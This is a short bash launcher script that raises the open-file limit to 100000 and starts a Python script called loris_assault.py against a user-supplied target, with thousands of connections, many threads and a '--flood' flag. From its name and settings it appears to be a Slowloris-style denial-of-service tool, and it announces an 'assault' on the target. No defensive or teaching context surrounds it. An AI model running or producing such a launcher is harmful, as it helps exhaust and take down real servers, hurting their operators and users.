#!/bin/bash

# Increase open file limit to allow thousands of connections
ulimit -n 100000

TARGET=$1
PORT=${2:-80}
CONNS=${3:-5000}
THREADS=${4:-50}

if [ -z "$TARGET" ]; then
    echo "Usage: ./launch.sh <target> [port] [connections] [threads]"
    exit 1
fi

echo "[*] Preparing assault on $TARGET:$PORT..."
echo "[*] Setting ulimit to 100000..."

# Run the python script with the aggressive settings
python3 loris_assault.py "$TARGET" -p "$PORT" -c "$CONNS" -t "$THREADS" --flood
